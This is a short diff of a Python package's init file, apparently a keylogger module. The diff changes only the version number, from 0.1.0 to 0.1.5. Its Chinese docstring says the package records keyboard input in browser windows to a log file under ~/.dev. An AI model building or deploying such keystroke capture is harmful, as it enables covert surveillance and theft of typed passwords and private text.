@@ -4,7 +4,7 @@
 仅监控浏览器窗口的键盘输入，记录到 ~/.dev/keylogger_{时间戳}.log
 """
 
-__version__ = "0.1.0"
+__version__ = "0.1.5"
 __author__ = "YLX-STUDIO"
 
 from .logger import KeyLogger, create_log_file
